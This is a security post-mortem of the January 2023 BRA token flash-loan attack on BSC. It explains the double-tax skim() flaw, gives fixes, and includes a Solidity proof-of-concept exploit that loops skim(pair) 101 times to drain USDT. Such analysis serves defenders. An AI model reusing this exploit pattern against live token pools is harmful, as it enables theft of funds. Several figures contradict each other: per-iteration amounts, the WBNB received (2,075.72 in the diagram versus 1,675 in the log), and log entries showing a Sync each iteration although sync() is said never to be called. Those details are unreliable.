# BRA Token — Double Tax Business Logic Flaw + skim() Compound Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2023-01-10 |
| **Protocol** | BRA Token |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | 819 BNB (~$224,000 USD) / On-chain USDT extracted: 458,918 USDT |
| **Attacker EOA** | [0x67a9...0795](https://bscscan.com/address/0x67a909f2953fb1138bea4b60894b51291d2d0795) |
| **Attack Contract 1** | [0x1fae...cb07](https://bscscan.com/address/0x1fae46b350c4a5f5c397dbf25ad042d3b9a5cb07) |
| **Attack Contract 2** | [0x6066...e7](https://bscscan.com/address/0x6066435edce9c2772f3f1184b33fc5f7826d03e7) |
| **Attack Tx 1** | [0x6759...4047](https://bscscan.com/tx/0x6759db55a4edec4f6bedb5691fc42cf024be3a1a534ddcc7edd471ef205d4047) (675 WBNB profit) |
| **Attack Tx 2** | [0x4e5b...9348](https://bscscan.com/tx/0x4e5b2efa90c62f2b62925ebd7c10c953dc73c710ef06695eac3f36fe0f6b9348) (144 WBNB profit) |
| **Vulnerable Contract** | [0x449f...3752](https://bscscan.com/address/0x449fea37d339a11efe1b181e5d5462464bba3752#code#L449-L457) |
| **Vulnerable LP Pool** | [0x8F4B...dF0E](https://bscscan.com/address/0x8F4BA1832611f0c364dE7114bbff92ba676AdF0E) (BRA-USDT PancakeSwap V2) |
| **Root Cause** | `_transfer()` double tax logic + missing `sync()` call → `skim()` compound vulnerability (business logic flaw) |
| **PoC Source** | [DeFiHackLabs — BRA_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/BRA_exp.sol) |
| **Analysis Reference** | [BlockSecTeam Twitter](https://twitter.com/BlockSecTeam/status/1612701106982862849) |

---

## 1. Vulnerability Overview

The BRA Token protocol was exploited on January 10, 2023 via a flash loan attack that chained multiple business logic flaws, resulting in the theft of approximately 819 BNB ($224,000).

The core vulnerability lies in the **double tax logic** present in BRA token's `_transfer()` function. BRA token is designed to levy a tax when the LP pool is either the sender or the recipient of a transfer. However, when PancakeSwap's `skim()` function is called, a situation arises where **the LP pool transfers excess tokens to itself**. In this case, `_transfer()` detects that both the sender and the recipient are the LP pool, **satisfying both conditions simultaneously**, and therefore applies a double tax.

The problem is that this tax remains inside the LP pool contract, and because `sync()` is never called, **the pool's internal `reserve` variable is never updated**. As a result, the pool's actual BRA balance grows larger than `reserve0`, creating an imbalance — and by repeatedly calling `skim(pair)`, this imbalance is amplified exponentially, accumulating an ever-growing excess of BRA.

The attacker ran this 101-iteration loop to maximize the BRA surplus, then swapped that BRA for USDT, extracting 458,918 USDT.

---

## 2. Vulnerable Code Analysis

### 2.1 `_transfer()` — Double Tax Logic Flaw (Core Vulnerability)

**Vulnerable code (`_transfer` function, estimated L449–L457):**

```solidity
// ❌ Vulnerability: When LP Pair is both sender and recipient, both conditions become true simultaneously
// ❌ Vulnerability: When skim() triggers a pair→pair transfer, tax is applied twice
// ❌ Vulnerability: After tax is applied, sync() is not called, causing reserve vs. actual balance imbalance
function _transfer(address sender, address recipient, uint256 amount) internal override {
    uint256 taxAmount = 0;

    // Buy tax condition: sender is LP Pair (someone is buying BRA)
    if (sender == uniswapV2Pair && !isExcludedFromFee[recipient]) {
        taxAmount += amount * buyTaxRate / 10000; // ❌ This condition also triggers on skim() calls
    }

    // Sell tax condition: recipient is LP Pair (someone is selling BRA)
    if (recipient == uniswapV2Pair && !isExcludedFromFee[sender]) {
        taxAmount += amount * sellTaxRate / 10000; // ❌ This condition also triggers on skim() calls
    }

    // ❌ On skim(pair) call: sender == pair, recipient == pair
    // → Both conditions satisfied → double tax applied
    // ❌ Tax tokens remain inside the pair contract
    // ❌ sync() not called → reserve0 unchanged, actual balance increases

    if (taxAmount > 0) {
        super._transfer(sender, address(this), taxAmount); // Tax stored in contract
        // Or tax remains in the pair itself
    }

    super._transfer(sender, recipient, amount - taxAmount);
    // ❌ PancakePair.sync() is not called here
}
```

**Fixed code:**

```solidity
// ✅ Explicitly block self-transfer cases (skim scenario) where LP Pair sends to itself
// ✅ Call sync() immediately after taxing an LP transfer to synchronize reserve
function _transfer(address sender, address recipient, uint256 amount) internal override {
    uint256 taxAmount = 0;

    // ✅ Self-referential transfers (e.g., skim()) are excluded from tax
    bool isSelfTransfer = (sender == recipient);

    if (!isSelfTransfer) {
        // Buy tax: sender is LP Pair and recipient is not excluded from fees
        if (sender == uniswapV2Pair && !isExcludedFromFee[recipient]) {
            taxAmount += amount * buyTaxRate / 10000;
        }

        // Sell tax: recipient is LP Pair and sender is not excluded from fees
        if (recipient == uniswapV2Pair && !isExcludedFromFee[sender]) {
            taxAmount += amount * sellTaxRate / 10000;
        }
    }

    if (taxAmount > 0) {
        super._transfer(sender, address(this), taxAmount);
        // ✅ If LP Pair is involved in a taxed transfer, immediately call sync() to update reserve
        if (sender == uniswapV2Pair || recipient == uniswapV2Pair) {
            IPancakePair(uniswapV2Pair).sync();
        }
    }

    super._transfer(sender, recipient, amount - taxAmount);
}
```

**Summary of issues:**
- On `skim(pair)` call, a `pair → pair` transfer occurs, satisfying both double tax conditions simultaneously
- Tax tokens accumulate inside the LP pool while `reserve` vs. actual balance divergence builds up
- Without a `sync()` call, the imbalance persists permanently and can be exploited repeatedly

### 2.2 Abuse of `skim()` Function (PancakeSwap V2 Standard Function)

```solidity
// PancakeSwap V2 PancakePair.sol — standard skim() function
// ✅ This function itself is not vulnerable — the issue lies in BRA's _transfer() logic
function skim(address to) external lock {
    address _token0 = token0;
    address _token1 = token1;
    // ❌ For BRA token: actual balance - reserve = surplus → sending to pair itself triggers double tax
    _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));
    _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));
    // ❌ sync() is not called after transfer → reserve is not updated
    // ✅ Original intent: should call sync() or update reserve via _update()
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Deploy attack contract: `0x1fae...cb07`
- Confirm availability of 1,400 WBNB flash loan from DODO DPP Advanced Pool
- Pre-analyze the double tax vulnerability in the BRA-USDT PancakeSwap V2 pool

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────────────┐
│  Attacker EOA: 0x67a9...0795                                        │
│  Attack Tx: 0x6759...4047  (Block: 24,655,772)                      │
└─────────────────────────────┬───────────────────────────────────────┘
                              │ testExploit() call
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [STEP 1] DODO DPP Advanced Pool Flash Loan                          │
│  0x0fe2...65F4 → Lend 1,400 WBNB to Exploit contract               │
└─────────────────────────────┬───────────────────────────────────────┘
                              │ DPPFlashLoanCall() callback
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [STEP 2] Unwrap WBNB (1,400 WBNB → 1,400 BNB)                     │
│  wbnb.withdraw(1400e18)                                             │
└─────────────────────────────┬───────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [STEP 3] BNB → BRA Swap (PancakeSwap multi-hop)                    │
│  1,000 BNB → USDT → BRA (acquire approx. 10,539 BRA)               │
│  Path: WBNB → USDT → BRA (Pair: 0x8F4B...dF0E)                     │
└─────────────────────────────┬───────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [STEP 4] Transfer entire BRA balance to LP Pair                    │
│  bra.transfer(BRA_USDT_Pair, 10,539 BRA)                           │
│  ↳ BRA._transfer() applies sell tax → pair balance > reserve        │
└─────────────────────────────┬───────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [STEP 5] Core Attack: skim(pair) repeated 101 times — compound     │
│           double tax amplification loop                             │
│                                                                     │
│  Iter │ skim() call                                                  │
│  ─────┼──────────────────────────────────────────────────────────── │
│   1   │ pair.skim(pair) → pair→pair double tax triggered            │
│       │   ↳ BRA._transfer(pair, pair, excess)                       │
│       │   ↳ sender==pair: sell tax △X BRA applied                  │
│       │   ↳ recipient==pair: buy tax △X BRA applied                │
│       │   ↳ total 2×△X BRA remains in pair (reserve not updated)  │
│   2   │ imbalance = prior imbalance + 2×△X → more double tax       │
│   ... │ Compound amplification (~325 BRA → ~196,475 BRA/iter       │
│       │ after 101 iterations)                                       │
│  101  │ Total accumulated BRA imbalance: hundreds of thousands      │
└─────────────────────────────┬───────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [STEP 6] Extract profit by swapping BRA→USDT                       │
│  pair.swap(0, 458,918_USDT, exploit, "")                           │
│  ↳ Swap accumulated BRA surplus into USDT                           │
│  ↳ On-chain confirmed: 458,918 USDT extracted                       │
└─────────────────────────────┬───────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [STEP 7] Re-swap USDT → WBNB (PancakeRouter)                       │
│  458,918 USDT → 2,075.72 WBNB                                      │
└─────────────────────────────┬───────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────────┐
│  [STEP 8] Repay flash loan + realize profit                          │
│  Repay 1,400 WBNB (return DODO flash loan)                          │
│  675.72 WBNB net profit (transferred to attacker)                   │
│  Total profit: ~$175,000 USD (Tx1)                                  │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.3 Attack Results

| Item | Value |
|------|-----|
| Flash loan capital | 1,400 WBNB |
| BRA purchase cost | 1,000 BNB |
| USDT extracted | 458,918 USDT (Tx1) |
| Total WBNB secured | 2,075.72 WBNB |
| Flash loan repaid | 1,400 WBNB |
| **Net profit (Tx1)** | **675.72 WBNB (~$175,000)** |
| **Net profit (Tx2)** | **144 WBNB (~$37,000)** |
| **Total loss** | **819 BNB (~$224,000)** |

---

## 4. PoC Code (Excerpt from DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

// PoC source: SunWeb3Sec/DeFiHackLabs — BRA_exp.sol
// Core attack logic only (with English comments)

contract Exploit is Test {
    // Main contract address constants
    IDPPAdvanced constant dppAdvanced = IDPPAdvanced(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4); // DODO flash loan pool
    WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);          // Wrapped BNB
    IUSDT constant usdt = IUSDT(0x55d398326f99059fF775485246999027B3197955);          // BSC-USDT
    IERC20 constant bra  = IERC20(0x449FEA37d339a11EfE1B181e5D5462464bBa3752);        // Vulnerable BRA token
    IPancakeRouter constant pancakeRouter = IPancakeRouter(
        payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)                            // PancakeSwap V2 Router
    );
    address BRA_USDT_Pair = 0x8F4BA1832611f0c364dE7114bbff92ba676AdF0E;               // BRA-USDT LP pool

    function go() public {
        // [Step 1] Execute flash loan of 1,400 WBNB from DODO
        uint256 baseAmount = 1400 * 1e18;
        dppAdvanced.flashLoan(baseAmount, 0, address(this), "xxas");

        // [Step 8] Transfer profit to attacker
        uint256 profit = wbnb.balanceOf(address(this));
        require(wbnb.transfer(msg.sender, profit), "transfer failed");
    }

    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes memory) external {
        // [Step 2] Unwrap WBNB to BNB
        wbnb.withdraw(baseAmount); // 1,400 WBNB → 1,400 BNB

        // [Step 3] Buy BRA tokens with 1,000 BNB (multi-hop swap)
        address[] memory swapPath = new address[](3);
        swapPath[0] = address(wbnb); swapPath[1] = address(usdt); swapPath[2] = address(bra);
        pancakeRouter.swapExactETHForTokens{value: 1000 ether}(
            1, swapPath, address(this), block.timestamp
        );
        // → Acquire approx. 10,539 BRA

        // [Step 4] Transfer entire acquired BRA to LP Pair — establish surplus balance state
        uint256 sendAmount = bra.balanceOf(address(this));
        bra.transfer(BRA_USDT_Pair, sendAmount);
        // BRA._transfer() leaves sell tax inside pair → reserve < actual balance

        // [Step 5] Core attack: repeat skim(pair) 101 times
        // Each call compounds the double tax accumulation inside the pair
        // BRA._transfer(pair→pair): sell tax + buy tax applied simultaneously → double tax
        // No sync() call → imbalance keeps growing
        for (uint256 i; i < 101; ++i) {
            IPancakePair(BRA_USDT_Pair).skim(BRA_USDT_Pair);
        }
        // After 101 iterations: pair's actual BRA balance exceeds reserve by hundreds of thousands of BRA

        // [Step 6] Extract imbalanced BRA as USDT
        uint256 pairBRABalance = bra.balanceOf(BRA_USDT_Pair);
        address[] memory inputPath = new address[](2);
        inputPath[0] = address(bra); inputPath[1] = address(usdt);
        uint256[] memory outAmounts = pancakeRouter.getAmountsOut(
            pairBRABalance - /* reserve0 */ 0, inputPath
        );
        uint256 usdtAmount = outAmounts[1];
        IPancakePair(BRA_USDT_Pair).swap(0, usdtAmount, address(this), "");
        // → Extract 458,918 USDT

        // [Step 7] Re-swap USDT → WBNB
        usdt.approve(address(pancakeRouter), type(uint256).max);
        inputPath[0] = address(usdt); inputPath[1] = address(wbnb);
        pancakeRouter.swapExactTokensForETH(usdtAmount, 1, inputPath, address(this), block.timestamp);

        // [Step 8] Verify flash loan repayment and wrap BNB → WBNB
        assert(address(this).balance >= baseAmount); // Profitability check
        wbnb.deposit{value: address(this).balance}();
        require(wbnb.transfer(msg.sender, baseAmount), "transfer failed"); // Repay DODO
    }

    receive() external payable {}
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Double tax logic — dual condition activation on skim() self-reference | CRITICAL | CWE-682 (Incorrect Calculation) |
| V-02 | Missing `sync()` call — LP reserve not updated after tax is applied | CRITICAL | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| V-03 | Insufficient tax condition validation — sender==recipient case unhandled | HIGH | CWE-754 (Improper Check for Unusual or Exceptional Conditions) |
| V-04 | Flash loan + repetition loop combined attack amplification | HIGH | CWE-400 (Uncontrolled Resource Consumption) |

### V-01: Double Tax Logic (Critical)
- **Description**: `_transfer()` checks sender and recipient independently, so when `skim(pair)` is called, the LP Pair becomes both `sender` and `recipient`, satisfying buy and sell tax conditions simultaneously
- **Impact**: Excessive tokens beyond the intended tax range accumulate inside the LP pool, causing a reserve imbalance
- **Attack Condition**: Attacker transfers any amount of BRA to the LP Pair, then repeatedly calls `skim(pair)`

### V-02: Missing `sync()` Call (Critical)
- **Description**: After `_transfer()` executes, `reserve0` of the LP Pair is not updated, causing the divergence between actual balance and reserve to persist permanently
- **Impact**: Each subsequent `skim()` call re-recognizes the prior double-tax remainder as new surplus, resulting in compound amplification
- **Attack Condition**: Repeated `skim()` calls while `PancakePair.sync()` is never called after `_transfer()`

### V-03: sender==recipient Case Unhandled (High)
- **Description**: No exception handling for self-referential transfers (sender == recipient)
- **Impact**: Direct root cause of the double tax attack
- **Attack Condition**: Triggerable with a single `skim(pair)` call, no special privileges required

### V-04: Flash Loan + Repetition Loop Combination (High)
- **Description**: A small initial capital investment (BRA purchase) is used with a 101-iteration loop to amplify the imbalance exponentially
- **Impact**: ~675 BNB profit on ~1,000 BNB investment (~68% return)
- **Attack Condition**: Sufficient flash loan capital + existence of a vulnerable token's LP pool

---

## 6. Remediation Recommendations

### 6.1 Immediate Fixes (Code Level)

**[Recommendation 1] Exempt self-referential transfers from tax:**

```solidity
// ✅ Skip tax when sender == recipient (defense against skim() self-reference)
function _transfer(address sender, address recipient, uint256 amount) internal override {
    // Skip tax calculation for self-referential transfers (e.g., skim())
    if (sender == recipient) {
        super._transfer(sender, recipient, amount);
        return;
    }
    // ... existing tax logic ...
}
```

**[Recommendation 2] Force `sync()` call immediately after LP tax is applied:**

```solidity
// ✅ Immediately synchronize reserve when a tax event involves the LP pool
function _transfer(address sender, address recipient, uint256 amount) internal override {
    bool lpInvolved = (sender == uniswapV2Pair || recipient == uniswapV2Pair);

    // Tax calculation and transfer logic ...

    // ✅ Must call sync() after any transfer involving the LP pool
    if (lpInvolved && uniswapV2Pair != address(0)) {
        try IPancakePair(uniswapV2Pair).sync() {} catch {}
        // try-catch ensures transfer proceeds even if sync() fails
    }
}
```

**[Recommendation 3] Block skim() when recipient is the LP pool itself (additional defense layer):**

```solidity
// ✅ Explicitly reject skim(pair) self-reference at the BRA token level
function _transfer(address sender, address recipient, uint256 amount) internal override {
    // Block cases where LP Pair transfers to itself (skim(pair) pattern)
    require(
        !(sender == uniswapV2Pair && recipient == uniswapV2Pair),
        "BRA: skim self-transfer not allowed"
    );
    // ... existing logic ...
}
```

### 6.2 Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Double tax logic | Add `sender == recipient` exception handling, block LP self-reference |
| V-02 Missing sync() | Force `sync()` call inside `_transfer()` whenever LP is involved |
| V-03 Insufficient condition validation | Exhaustively review edge cases before applying tax (self-reference, proxy calls, etc.) |
| V-04 Compound amplification | Reject at token level when `skim()` recipient is the LP Pair itself |
| General | Write tests covering AMM `skim()`/`sync()` interaction scenarios before deployment |
| General | Apply fuzz testing for repetition-loop amplification attacks (Echidna/Foundry) |

---

## 7. Lessons Learned

1. **Exhaustive edge case review is mandatory for tax token logic**: When designing a tax mechanism, the behavior for every combination — `sender == recipient`, `sender == contract`, `recipient == LP Pair == sender` — must be explicitly defined. A design that "only considers normal buys and sells" will produce unexpected vulnerabilities when interacting with internal AMM functions.

2. **Tax application and reserve synchronization must be handled atomically**: Failing to call `sync()` after collecting LP taxes allows the imbalance between reserve and actual balance to accumulate, turning standard AMM functions like `skim()` into attack vectors. Tax transfers and reserve updates must occur atomically within the same transaction.

3. **Integration testing against all PancakeSwap/Uniswap standard functions (`skim`, `sync`, `flash`) is mandatory**: Before registering a custom token in an AMM LP, every interaction scenario with all of the AMM's standard functions (`swap`, `mint`, `burn`, `skim`, `sync`, `flash`) must be tested. In particular, every case where the LP pool acts as either recipient or sender must be verified.

4. **Defense against repetition-loop attack patterns**: To guard against compound amplification attacks that exploit repeated calls rather than a single exploit, any state change that can be amplified via a loop must have a cap or cooldown enforced.

5. **Business logic flaws are harder to detect than code bugs**: This attack did not exploit an overflow or a missing access control check — it exploited a logic flaw that "works as intended but produces unexpected results under compound interactions." Manual scenario analysis and expert auditing are more important than automated tooling for this class of vulnerability.

---

## 8. On-Chain Verification

### 8.1 Attack Tx Basic Information (Block: 24,655,772)

| Item | Value |
|------|-----|
| from (Attacker EOA) | 0x67a909f2953fb1138beA4B60894B51291D2d0795 |
| to (Attack Contract) | 0x1FAe46B350C4A5F5C397Dbf25Ad042D3b9a5cb07 |
| Block Number | 24,655,772 |
| Gas Used | 7,137,662 (Limit: 35,000,000) |
| Called Function Selector | 0x0f59f83a |

### 8.2 PoC vs. On-Chain Amount Comparison

| Item | PoC Described Value | On-Chain Actual Value | Match |
|------|-----------|-------------|----------|
| Flash loan WBNB | 1,400 WBNB | 1,400 WBNB (Log[00]) | ✅ Match |
| BNB swap input | 1,000 BNB | 1,000 BNB (Log[02]) | ✅ Match |
| BRA purchased | Not specified | 10,539.35 BRA (Log[08]) | ✅ Confirmed |
| skim() iterations | 101 | 101 (Log pattern confirmed) | ✅ Match |
| USDT extracted | Calculated value | 458,918 USDT (Log[417]) | ✅ Confirmed |
| Final net profit | 675 WBNB | 675.72 WBNB (Log[429]) | ✅ Match |

### 8.3 On-Chain Event Log Sequence

```
[00] Transfer(WBNB): DODO→Exploit 1,400 WBNB  (flash loan received)
[01] Withdrawal(WBNB): Exploit unwraps 1,400 WBNB
[02] Deposit(WBNB): PancakeRouter wraps 1,000 WBNB
[03] Transfer(WBNB): Router→WBNB-USDT Pair
[04] Transfer(USDT): WBNB-USDT Pair→BRA-USDT Pair  (271,699 USDT)
[05] Sync(WBNB-USDT Pair): buy complete
[06] Swap(WBNB-USDT Pair): swap event
[07] Transfer(BRA): BRA-USDT Pair→Exploit  325 BRA (tax)
[08] Transfer(BRA): BRA-USDT Pair→Exploit  10,539 BRA (purchased amount)
[09] Sync(BRA-USDT Pair): buy complete
[10] Swap(BRA-USDT Pair): swap event
[11~16] Transfer(BRA): Exploit→BRA-USDT Pair  (BRA transfer)
[17~416] Transfer×3 + Sync ×101 iterations: skim(pair) double tax loop
   └ Each iteration: tax1(BRA), tax2(BRA), body(BRA), Sync
   └ Initial ~325 BRA/iter → Final ~6,076 BRA/iter (compound amplification)
[417] Transfer(USDT): BRA-USDT Pair→Exploit  458,918 USDT  ← profit extracted
[418] Sync(BRA-USDT Pair): post-swap synchronization
[419] Swap(BRA-USDT Pair): swap event
[421] Transfer(USDT): Exploit→USDT-WBNB Pair
[423] Transfer(WBNB): USDT-WBNB Pair→Exploit  1,675 WBNB
[428] Transfer(WBNB): Exploit→DODO  1,400 WBNB  ← flash loan repaid
[429] Transfer(WBNB): Exploit→Attacker EOA  675.72 WBNB  ← net profit
```

### 8.4 Observed Compound Amplification of Double Tax

The compound amplification of the skim() loop is clearly confirmed in the on-chain logs:

| Iteration Range | BRA Double Tax per Iteration |
|----------|--------------------------|
| Early (~iterations 1–5) | ~325 BRA |
| Mid (~iteration 50) | ~5,000 BRA |
| Late (~iteration 100) | ~6,076 BRA |
| Final (101-iteration total) | Hundreds of thousands of BRA accumulated |

Each `skim()` call generates 3 `Transfer(pair→pair)` events, and because `reserve` is never updated, the next `skim()` processes an even larger surplus — confirming compound amplification.